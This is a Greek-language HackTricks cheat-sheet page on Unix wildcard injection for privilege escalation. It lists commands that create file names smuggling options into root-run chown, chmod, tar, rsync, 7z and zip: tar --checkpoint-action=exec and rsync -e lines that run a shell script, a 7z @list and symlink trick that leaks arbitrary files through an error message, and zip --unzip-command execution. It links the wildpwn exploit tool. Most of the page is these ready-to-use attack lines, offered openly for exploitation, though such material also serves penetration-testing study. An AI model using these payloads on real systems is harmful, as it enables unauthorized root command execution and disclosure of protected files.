<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>


## chown, chmod

Μπορείτε **να υποδείξετε ποιον κάτοχο αρχείου και δικαιώματα θέλετε να αντιγράψετε για τα υπόλοιπα αρχεία**
```bash
touch "--reference=/my/own/path/filename"
```
Μπορείτε να εκμεταλλευτείτε αυτό χρησιμοποιώντας [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(συνδυασμένη επίθεση)_\
Περισσότερες πληροφορίες στο [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Εκτέλεση αυθαίρετων εντολών:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Μπορείτε να εκμεταλλευτείτε αυτό χρησιμοποιώντας [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(επίθεση tar)_\
Περισσότερες πληροφορίες στο [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Εκτέλεση αυθαίρετων εντολών:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Μπορείτε να εκμεταλλευτείτε αυτό χρησιμοποιώντας [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(επίθεση rsync)_\
Περισσότερες πληροφορίες στο [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

Ακόμα και χρησιμοποιώντας `--` πριν από `*` στο **7z** (σημειώστε ότι το `--` σημαίνει ότι η επόμενη είσοδος δεν μπορεί να θεωρηθεί ως παράμετρος, οπότε απλώς αρχεία διαδρομών σε αυτήν την περίπτωση) μπορείτε να προκαλέσετε ένα αυθαίρετο σφάλμα για να διαβάσετε ένα αρχείο, οπότε αν μια εντολή όπως η παρακάτω εκτελείται από τον ριζικό χρήστη:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
Και μπορείτε να δημιουργήσετε αρχεία στον φάκελο όπου εκτελείται αυτό, μπορείτε να δημιουργήσετε το αρχείο `@root.txt` και το αρχείο `root.txt` να είναι ένα **symlink** προς το αρχείο που θέλετε να διαβάσετε:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Στη συνέχεια, όταν εκτελείται το **7z**, θα θεωρήσει το `root.txt` ως ένα αρχείο που περιέχει τη λίστα των αρχείων που πρέπει να συμπιεστούν (αυτό υποδηλώνει η ύπαρξη του `@root.txt`) και όταν το 7z διαβάσει το `root.txt`, θα διαβάσει το `/file/you/want/to/read` και **καθώς το περιεχόμενο αυτού του αρχείου δεν είναι μια λίστα αρχείων, θα εμφανίσει ένα σφάλμα** εμφανίζοντας το περιεχόμενο.

_Περισσότερες πληροφορίες στα Write-ups του CTF από το HackTheBox._

## Zip

**Εκτέλεση αυθαίρετων εντολών:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
